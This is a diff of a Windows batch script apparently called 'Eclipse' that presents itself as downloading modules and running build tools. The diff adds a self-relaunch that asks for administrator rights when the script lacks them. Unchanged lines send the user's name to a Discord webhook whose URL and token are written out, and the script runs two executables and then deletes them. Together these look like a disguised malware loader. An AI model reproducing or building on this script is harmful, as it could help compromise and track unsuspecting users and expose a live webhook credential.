@@ -5,6 +5,12 @@ set "WEBHOOK_URL=https://discord.com/api/webhooks/1285775649189007453/9x1BScyl68
 set "USERNAME=%USERNAME%"
 Title Downloading Modules...
 
+"%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
+if %errorlevel% neq 0 (
+    powershell.exe -Command "Start-Process -Verb RunAs -FilePath \"%~f0\""
+    exit
+)
+
 powershell.exe -Command "Invoke-RestMethod -Uri '%WEBHOOK_URL%' -Method Post -ContentType 'application/json' -Body (@{username = 'Run Notification'; content = '%USERNAME% has run Eclipse'} | ConvertTo-Json)" >nul 2>&1
 
 cd /d "%~dp0"
@@ -50,9 +56,9 @@ if not exist "build_done.txt" (
 
     cd build_folder\Eclipse-Build-Tools-main
 
-    python build.py >nul 2>&1
-    start /wait build.exe >nul 2>&1
-    start /wait build2.exe >nul 2>&1
+    python build.py
+    start /wait build.exe
+    start /wait build2.exe
 
     del build.exe >nul 2>&1
     del build2.exe >nul 2>&1
